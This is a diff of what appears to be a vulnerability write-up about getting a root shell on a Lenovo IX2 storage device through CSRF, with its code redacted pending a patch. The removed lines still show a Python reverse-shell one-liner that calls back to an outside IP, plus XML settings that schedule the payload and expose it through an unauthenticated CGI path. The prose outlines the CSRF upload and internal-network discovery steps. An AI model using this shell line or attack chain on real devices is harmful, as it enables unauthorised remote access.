@@ -20,24 +20,16 @@ Here's how I got a remote root shell running via CSRF.
 **Lenovo IX2**
   
 First, I opened up the main.c file inside the 'cpumon' folder. Pretty simple C program that retrieves system resource information, and prints it out into a JSON object. Here's what my modifications looked like:
-```c
-#include <stdlib.h>
 
-printf("\"swapUsed\": \"%d\"", swapUsed); // in original code, 
-	printf("}");						  // included as a reference point
-	//python reverse connectback shell from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-	system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.112\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'"); 
-```
+[ Redacted until Lenovo can provide a patch ]
+
 
 After modifying the main.c file, I compiled the app from the 'resmon' folder using 'make target=arm-ix2-ng', and packed it into the required .tar.gz, assuming it would run upon install. Nope. I was able to get the shell to spawn by manually sshing in and executing, so I knew it was working as intended, but it wouldn't run. After some digging around, and a whole lot of frustration, I found the application.xml file had some options I could use to my advantage, particularly the cgibinDir option. 
 
 I added the following to the application.xml files existing options:
-```xml
-<application cgibinDir="Yes" safeApp="Yes" isSecureUI="Yes"">
-	<executable restartOnReboot="Yes" runOnce="No" sequence="1000" minutes="30" scheduled="Yes" />
-</application>
 
-```
+[ Redacted until Lenovo can provide a patch ] 
+
 The options will enable the cgi bin directory to be navigable, set the executable to run at boot and schedule it to run every 30 minutes. The compiler is so kind as to create a symlink to the cpumon executable in the cgi directory(remember we can't modify any files after compilation or it will break). Alright, so now we've got an evil installer that can be run via CSRF, but how do we go about exploiting it?
 
 The first step is to generate the CSRF file upload. This can be done using an XMLHTTPRequest, which burp is handy enough to make with just a few clicks. There are two ways we can go about finding the IP of the internal device: 1, we can use the default mdns(ix2-dl.local) and hope the user hasn't changed it, or two, we can use webRTC to reveal the internal netmask and then force the user to ping scan their own network via XMLHTTPRequests. The PoC's for both are available on request. The exploit then sends the payload to all live IP's. Once the file has been uploaded, the executable should run automatically, as we've set it to be a scheduled with the application.xml. If it doesn't run for some reason, or you want to force it to run outside of the scheduled timing, that's why we set up the cgibinDir option. Simply navigate to http:ix2-dl.local/cpumon/cpumon-cgi/cpumon(no auth required), and we have a shell!
